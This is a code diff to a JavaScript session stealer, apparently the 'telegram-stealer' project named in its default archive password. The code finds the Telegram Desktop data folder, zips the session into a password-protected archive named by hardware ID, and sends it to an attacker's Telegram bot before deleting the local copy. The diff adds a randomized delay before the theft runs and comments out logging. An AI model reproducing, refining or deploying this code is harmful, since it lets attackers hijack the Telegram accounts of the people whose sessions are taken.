@@ -35,10 +35,6 @@ async function findTelegramDirectoryPath(appDataPath) {
   return path.join(appDataPath, telegramDirectory.name)
 }
 
-function randomStr() {
-  return (Math.random() + 1).toString(36).substring(2)
-}
-
 function archiveTelegramSession(telegramDirectoryPath, archivePath, archivePassword) {
   return new Promise(async (resolve, reject) => {
     const output = fs.createWriteStream(archivePath)
@@ -51,7 +47,7 @@ function archiveTelegramSession(telegramDirectoryPath, archivePath, archivePassw
     })
 
     output.on('close', () => {
-      console.log(`Archive size: ${archive.pointer() / 1024 / 1024} MB`)
+      // console.log(`Archive size: ${archive.pointer() / 1024 / 1024} MB`)
       resolve()
     })
 
@@ -113,20 +109,23 @@ function deleteArchive(archivePath) {
   })
 }
 
-const run = async ({
+async function run({
   telegramChatId,
   telegramToken,
-  archivePassword = 'https://github.com/rigwild/telegram-stealer'
-}) => {
+  archivePassword = 'https://github.com/rigwild/telegram-stealer',
+  waitOnStart = true
+}) {
+  if (!telegramChatId) throw new Error('Telegram chat ID is required')
+  if (!telegramToken) throw new Error('Telegram token is required')
+
+  // Wait before execution
+  if (waitOnStart) await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 5000 + 3000)))
+
   const appDataPath = await getAppDataPath()
   const telegramDirectoryPath = await findTelegramDirectoryPath(appDataPath)
-  // console.log(tempDirectory)
-  // console.log(telegramDirectoryPath)
-
   const hwid = await getHwid()
   const archivePath = path.join(tempDirectory, `${hwid}.zip`)
   await archiveTelegramSession(telegramDirectoryPath, archivePath, archivePassword)
-  await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 5000 + 3_000)))
   await sendArchiveTelegramWebhook(archivePath, archivePassword, telegramChatId, telegramToken)
   await deleteArchive(archivePath)
 }
